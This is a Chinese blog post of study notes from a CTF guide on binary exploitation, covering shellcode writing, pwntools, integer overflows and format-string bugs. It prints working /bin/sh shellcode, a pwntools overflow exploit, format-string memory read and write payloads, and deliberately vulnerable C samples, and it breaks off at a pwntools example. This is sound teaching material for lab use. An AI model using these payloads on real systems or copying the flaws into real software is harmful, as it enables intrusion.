<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ctf-guide-pwn-2 | wd-z711&#39;s B10g</title>
  <meta name="author" content="wd-z711">
  
  <meta name="description" content="Common student in China. Interested in web &amp; re.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="ctf-guide-pwn-2"/>
  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-YHJSKZDC3Y', 'auto');
  ga('send', 'pageview');
</script>




<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> ctf-guide-pwn-2</h1>
		</div>
	



<div class="row post">

	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="CTF-竞赛权威指南-PWN-2"><a href="#CTF-竞赛权威指南-PWN-2" class="headerlink" title="CTF 竞赛权威指南-PWN-2"></a>CTF 竞赛权威指南-PWN-2</h1><h2 id="0x04-shellcode-开发"><a href="#0x04-shellcode-开发" class="headerlink" title="0x04 shellcode 开发"></a>0x04 shellcode 开发</h2><span id="more"></span>
<p>&emsp; Shellcode 可以分为本地和远程两种类型。本地 shellcode 通常用于提权，攻击者利用高权限程序中的漏洞（例如缓冲区溢出），获得与目标进程相同的权限。远程 shellcode 则用于攻击网络上的另一台机器，通过 TCP/IP 套接字为攻击者提供 shell 访问。</p>
<p>&emsp;根据连接的方式不同，shell 可分为反向 shell（由受害者机器上运行的 shellcode 建立与攻击者机器的连接）、绑定 shell（受害者机器上运行的 shellcode 绑定到端口，由攻击者发起连接）和套接字重用 shell（重用 exploit 所建立的连接，从而绕过防火墙）。</p>
<p>&emsp;有时，攻击者注入目标进程中的字节数是被限制的，因此可以将 shellcode 分段执行，由前一阶段比较简短的 shellcode 将后一阶段复杂的 shellcode 下载并执行。但有时攻击者并不能确定后一阶段的 shellcode 被加载到内存的哪个位置，因此就有 egg-hunt shellcode，这段代码会在内存中搜索，直到找到后一阶段的 shellcode(egg) 并执行。</p>
<p>&emsp;Shellcode 的载体如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// in.asm</span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">  <span class="type">char</span> shellcode_stack[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(shellcode); i++) shellcode_stack[i] = shellcode[i];</span><br><span class="line"></span><br><span class="line">  (*(<span class="built_in">void</span>(*)())shellcode_stack)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void (*)()，表示一个不接受任何参数，且返回值为 void 的函数指针</span><br><span class="line">*(void(*)())s，其中s是一个字符串数组，即解引用函数指针，得到函数本身</span><br><span class="line">(*(void(*)())s)()，将s作为一个函数并调用</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack test.c -o test</span><br></pre></td></tr></table></figure>
<p>&emsp;可以在 <a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">link</a> 上找到好多 shellcode，举几个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; linux 32 bit</span><br><span class="line">; in.asm</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; int execve(const char *filename, char *const argv[], char *const envp[])</span><br><span class="line">    xor  ecx, ecx      ; ecx = NULL</span><br><span class="line">    mul  ecx           ; eax = NULL</span><br><span class="line">    mov  al, 11        ; execve syscall number</span><br><span class="line">    push ecx           ; string NULL</span><br><span class="line">    push 0x68732f2f    ; &quot;//sh&quot;</span><br><span class="line">    push 0x6e69622f    ; &quot;/bin&quot;</span><br><span class="line">    mov  ebx, esp      ; pointer to &quot;/bin/sh\0&quot;</span><br><span class="line">    int  0x80            ; filename(EBX), argv[](ECX), envp[](EDX)</span><br></pre></td></tr></table></figure>
<p>&emsp;可以使用 NASM 汇编代码进行编译，使用 ld 进行链接，运行后获得 shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 in.asm</span><br><span class="line">ld -m elf_i386 in.o -o in.out</span><br><span class="line">./in.out</span><br></pre></td></tr></table></figure>
<p>&emsp;可以用 Objdump 提取 shell，命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./in.out|grep &#x27;[0-9a-f]:&#x27;|grep -v &#x27;file&#x27;|cut -f2 -d:| cut -f1-6 -d&#x27; &#x27;|tr -s &#x27; &#x27;|tr &#x27;\t&#x27; &#x27; &#x27;|sed &#x27;s/ $//g&#x27;|sed &#x27;s/ /\\x/g&#x27;|paste -d &#x27;&#x27; -s|sed &#x27;s/^/&quot;/&#x27;|sed &#x27;s/$/&quot;/g&#x27;</span><br></pre></td></tr></table></figure>
<p>&emsp;64 位 linux 的 shellcode 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">	; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">	xor  rdx, rdx                  ; rdx=NULL</span><br><span class="line">	mov  qword rbx, &quot;//bin/sh&quot;    </span><br><span class="line">	shr  rbx, 0x8 </span><br><span class="line">	push rbx                       ; rdi = &quot;/bin/sh&quot;</span><br><span class="line">	mov  rdi, rsp</span><br><span class="line">	push rax</span><br><span class="line">	push rdi                       </span><br><span class="line">	mov  rsi, rsp                  ; rsi = [&quot;/bin/sh&quot;]</span><br><span class="line">	mov  al, 0x3b                  ; syscall number</span><br><span class="line">	syscall</span><br></pre></td></tr></table></figure>
<p>&emsp;有时被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等，需要做特殊处理。例如，Null-free shellcode 不能包含 NULL，因为 NULL 会将字符串操作函数截断，这样注入的 shellcode 就只剩下 NULL 前面的那一段，可以用其他的指令替代 NULL，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B8 01000000  MOV EAX, 1</span><br><span class="line"></span><br><span class="line">33C0         XOR EAX, EAX</span><br><span class="line">40           INC EAX</span><br></pre></td></tr></table></figure>
<p>&emsp;对于只能使用可见字符的 shellcode，可以使用自修改代码的方法，将原始 shellcode 字符进行编码，相应的也有解码器，metasploit 的 alphanumeric 编码器可以完成此工作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;)&#x27; | msfvenom -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX</span><br></pre></td></tr></table></figure>
<p>&emsp;Pwntools 可以简单的编写 exp 脚本，拥有本地执行、远程连接读写、shellcode 生成、构建 ROP 链等功能。Pwntools 分为两个模块，一个模块是 pwn，可将所有子模块和一些常用的系统库导入。而另一个模块是 pwnlib，常用于基于 Pwntools 的二次开发。Pwntools 的常用子模块如下：</p>
<ul>
<li>pwnlib.tubes。与 sockets、processes、ssh 进行连接。举一个 listen 开启本地监听端口，然后使用 remote 开启套接字管道与其交互的例子：</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240510193428328.png" alt="image-20240510193428328" style="zoom:67%;" /></p>
<ul>
<li>pwnlib.elf。展示获得 ELF 文件装载的基地址、符号地址、GOT 地址与 PLT 地址，并且加载 libc，并得到 system 函数的地址。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240511193217902.png" alt="image-20240511193217902" style="zoom:67%;" /></p>
<p>&emsp;也可以修改 ELF 的代码：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240511193536301.png" alt="image-20240511193536301" style="zoom:80%;" /></p>
<p>&emsp;也可以处理一些核心转储文件：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240511195226484.png" alt="image-20240511195226484" style="zoom:67%;" /></p>
<ul>
<li>pwnlib.asm。用于汇编与反汇编代码。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240511200532240.png" alt="image-20240511200532240" style="zoom:67%;" /></p>
<p>&emsp;构建具有指定二进制数据的ELF文件，并使用模板生成 shellcode，通过 make_elf 得到 ELF 文件。make_elf_from_assembly 允许构建具有指定汇编代码的 ELF 文件，与 make_elf 不同的是其直接从汇编生成 ELF 文件，并且保留了所有的符号。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240511201811825.png" alt="image-20240511201811825" style="zoom:67%;" /></p>
<ul>
<li>pwnlib.gdb。使用 gdb.attach 可以 attach 到指定进程或 pwnlib.tubes 对象。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240511205519810.png" alt="image-20240511205519810" style="zoom:67%;" /></p>
<ul>
<li>pwnlib.dynelf。用于应对无 libc 的漏洞利用。首先找到 libc 的基地址，然后使用符号表和字符串表对所有符号进行解析，直到找到我们需要的函数的符号。</li>
<li>pwnlib.rop。ROP 链（Return-Oriented Programming chain）是一种利用已有的程序代码来执行恶意操作的方法。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240511233626061.png" alt="image-20240511233626061" style="zoom:67%;" /></p>
<p>&emsp;其中填充（padding）的作用是调整栈指针（<code>rsp</code>）以确保返回地址和参数正确对齐。</p>
<p>&emsp;Zio 可以在 stdin/stdout 与 TCP socket io 之间提供统一的接口，当本地开发完 exploit 后，可以很方便的将目标切换到远程服务器，pwntools 也可以完成这些工作。</p>
<h2 id="0x05-整数安全"><a href="#0x05-整数安全" class="headerlink" title="0x05 整数安全"></a>0x05 整数安全</h2><p>&emsp;如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生危险。关于整数的异常情况主要有 3 种：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出，溢出标志 OF 可检测有符号数的溢出。</span><br><span class="line">（2）回绕，无符号数 0-1 时会变成最大的数，如 1 字节的无符号数会变为 255，而 255+1 会变成最小数 0。进位标志 CF 可检测无符号数的回绕。</span><br><span class="line">（3）截断，将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断。</span><br></pre></td></tr></table></figure>
<p>&emsp;整数溢出要配合其它的漏洞才可以被利用，例如 memcpy/strncpy 很容易通过整数溢出导致缓冲区溢出。例如下面的例子，int len 是有符号的，memcpy 的第 3 个参数是无符号的，因此如果给 len 一个负数，那就寄了。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240518183434092.png" alt="image-20240518183434092" style="zoom:67%;" /></p>
<p>&emsp;再看一个回绕和溢出的例子。但是如果 len 过大，len+5 是有可能发生回绕的。比如，如果 len=0xFFFFFFFF，则 len+5=0x00000004，如果这时 malloc 只分配了 4 字节内存，然后在里面写入大量数据，就发生了缓冲区溢出。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240518183833120.png" alt="image-20240518183833120" style="zoom:67%;" /></p>
<p>&emsp;一个真正的整数溢出漏洞，strlen 返回 size_t，但是接收为 unsigned char，当长度大于 255 时，就会发生截断：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">  <span class="keyword">if</span> (passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;good\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bad\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">validate_passwd</span>(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;发现返回地址相对于缓冲区为 20：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240518190254050.png" alt="image-20240518190254050" style="zoom: 67%;" /></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240518190323136.png" alt="image-20240518190323136" style="zoom:67%;" /></p>
<p>&emsp;因此可以构建 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x7fffffffe308</span> + <span class="number">0x20</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span></span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">20</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">append = <span class="number">261</span> - <span class="built_in">len</span>(payload)</span><br><span class="line">payload += <span class="string">b&#x27;C&#x27;</span> * append</span><br><span class="line">p = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;上述脚本是得不到正确的 shell 的，经过调研，这是因为返回地址为 <code>(\xe3\xff\xff\xff\x7f\x00\x00</code>，其中必有 \x00 字节，因此会导致 strlen 失败。</p>
<h2 id="0x06-格式化字符串"><a href="#0x06-格式化字符串" class="headerlink" title="0x06 格式化字符串"></a>0x06 格式化字符串</h2><p>&emsp;变参函数是参数数量可变的函数，例如 printf。变参函数要获取可选参数时，必须通过一个 va_list（argument pointer）的对象，它包含了栈中参数的位置。<code>格式化字符串是格式化输出函数中用于指定输出参数的格式与相对位置的字符串参数。</code>有如下格式化输出函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fprintf：按照格式字符串将输出到流中。参数分别为流、格式字符串与变参列表。</span><br><span class="line">printf：等同于 fprintf，但是它的输出为 stdout。</span><br><span class="line">sprintf：等同于 fprintf，但是它的输出不是流而是数组。</span><br><span class="line">snprintf：等同于 sprintf，但是它指定了可写入字符的最大值 size。</span><br><span class="line">dprintf：等同于 fprintf，但是它的输出不是流而是文件。</span><br><span class="line">vfprintf、vprintf、vsprintf、vsnprintf、vdprintf：与上面的函数对应，但是它们将变参列表换成了 va_list 类型的参数。</span><br></pre></td></tr></table></figure>
<p>&emsp;转换规则：type 表示转换类型。parameter 用于指定某个参数，例如 <code>%2$d</code>，表示输出后面的第 2 个参数。flag 调整输出和打印的符号、空白、小数点等。width 指定输出字符的最小个数。precision 指示打印符号个数、小数位数或者有效数字个数。length 指定参数的大小。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][width][.precision][length]type</span><br></pre></td></tr></table></figure>
<p>&emsp;几个特殊的语句：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240518225401190.png" alt="image-20240518225401190" style="zoom:80%;" /></p>
<p>&emsp;FORTIFY SOURCE 让格式化字符串漏洞的利用更加困难。举例一个格式化漏洞的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void main() &#123;</span><br><span class="line">  printf(&quot;%s %d %s %x %x %x %3$s&quot;, &quot;hello&quot;, 233, &quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/ctf-guide-pwn-2/image-20240518233323636.png" alt="image-20240518233323636" style="zoom:67%;" /></p>
<p>&emsp;格式化字符串漏洞使用后的结果：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖。</p>
<ul>
<li>使程序崩溃。通常使用 <code>%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</code>即可触发崩溃。原因为：（1）对于每一个 %s，都要从栈中获取一个数字，将其视为一个地址，然后打印出地址指向的内存，直到出现一个空字符。（2）获取的某个数字可能并不是一个地址，或者是受保护的地址。</li>
<li>栈数据泄露。<code>使程序崩溃只是验证漏洞的第一步</code>，还可以利用格式化函数获得内存数据，比如返回地址：</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240518235129579.png" alt="image-20240518235129579" style="zoom:67%;" /></p>
<p>&emsp;可以通过指定 n，从而直接使用<code>%n$p</code>来输出格式字符串之后的第 n 个数据。</p>
<ul>
<li>任意地址内存泄露。使用<code>%4$s</code>来输出格式字符串之后的第 4 个数据所指向的地址。也可以输出任意地址的数据。假设有程序：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">128</span>];</span><br><span class="line">  <span class="type">int</span> arg1 = <span class="number">1</span>, arg2 = <span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">char</span> arg4[<span class="number">10</span>] = <span class="string">&quot;ABCD&quot;</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -m32 -fno-stack-protector -no-pie main.c -o a.out</span><br></pre></td></tr></table></figure>
<p>&emsp;若 format 为 <code>AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code>，那么输出：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519115750735.png" alt="image-20240519115750735" style="zoom:67%;" /></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519120038325.png" alt="image-20240519120038325" style="zoom:67%;" /></p>
<p>&emsp;我们若想读取字符串 ABCD，则首先查看其地址为 0xffffd4ba，然后：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&quot;\xba\xd4\xff\xff.%13$s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode written to shellcode.bin&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/ctf-guide-pwn-2/image-20240519122642718.png" alt="image-20240519122642718" style="zoom:67%;" /></p>
<p>&emsp;也可以把某函数的 GOT 地址传进去，从而获得所对应函数的虚拟地址。然后根据函数在 libc 中的相对位置，就可以计算出任意函数地址，例如 system。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519123029450.png" alt="image-20240519123029450" style="zoom: 80%;" /></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519124023770.png" alt="image-20240519124023770"></p>
<ul>
<li>栈数据覆盖。格式化字符串漏洞可以通过修改栈和内存来劫持程序的执行流。例如：</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240519124627997.png" alt="image-20240519124627997" style="zoom:67%;" /></p>
<p>&emsp;如果要把 arg2 覆盖为 0x20，那么首先查看到 arg2 的地址为：0xffffd498。那么 shellcode=b”\x98\xd4\xff\xff%28d%13$n”，意思就是将 0xffffd498 改为 0x20（4字节地址+28字节整数）。</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519125952777.png" alt="image-20240519125952777"></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519130017434.png" alt="image-20240519130017434"></p>
<ul>
<li>任意地址内存覆盖。上面的方法所能覆盖的最小值只能是 4，因为地址就占了 4 字节。可以使用格式字符串：<code>&quot;AA%15$nA&quot;+&quot;\x98\xd4\xff\xff&quot;</code>，其意思是，开头的 <code>AA</code> 占 2 个字节，即将地址赋值为 2，<code>%15$n</code> 占5个字节（这里不是<code>%13$n</code>，因为地址被放在了后面，偏移了 8 个字节），是第 15 个参数，后面跟上一个<code>A</code>占用 1 个字节。于是前半部分总共占用 2+5+1=8 个字节，刚好是两个参数的宽度，8 字节对齐十分重要。最后，输入我们要覆盖的地址。</li>
</ul>
<p><img src="/images/ctf-guide-pwn-2/image-20240519132301831.png" alt="image-20240519132301831"></p>
<p>&emsp;而对于要覆盖的数字很大的情况下，之前说的是前面要输出等量的字符，这样往往会覆盖掉其它重要的地址而出错。我们可以逐字节覆盖，这样的话字符量就少了很多。如下所示：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240519132638093.png" alt="image-20240519132638093" style="zoom:67%;" /></p>
<p>&emsp;例如尝试逐字节写入 0x12345678 到 0xffffd498，可以这样构造（关闭 ASLR，保证栈在 gdb 环境与直接运行中保持一致，虽然地址不同；gdb 环境中的栈地址和直接运行是不一样的，所以需要结合格式化字符串漏洞读取内存，可以先泄露一个地址，再根据该地址计算实际地址）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x98\xd4\xff\xff&quot; + b&quot;\x99\xd4\xff\xff&quot; + b&quot;\x9a\xd4\xff\xff&quot; + b&quot;\x9b\xd4\xff\xff&quot; + b&quot;%104c%13$hhn&quot; + b&quot;%222c%14$hhn&quot; + b&quot;%222c%15$hhn&quot; + b&quot;%222c%16$hhn&quot;</span><br></pre></td></tr></table></figure>
<p>&emsp;其中，前四个部分是 4 个写入地址，占 16 字节,后面四个部分分别用于写入十六进制数，由于使用了 hh，所以只会保留一个字节：<code>0x78(16+104=120-&gt;0x78)</code>、<code>0x56(120+222=342-&gt;0x0156-&gt;0x56)</code>、<code>0x34(342+222=564&gt;0x0234-&gt;0x34)</code>、<code>0x12(564+222=786-&gt;0x312-&gt;0x12)</code>。而在 linux 64 位中，由于参数由寄存器传递，因此格式化字符串覆盖栈的攻击方式无用。</p>
<p>&emsp;pwntools 中有专门的 fmtstr 模块，用于格式化字符串的利用。举个例子（不开 ASLR 与 PIE）：</p>
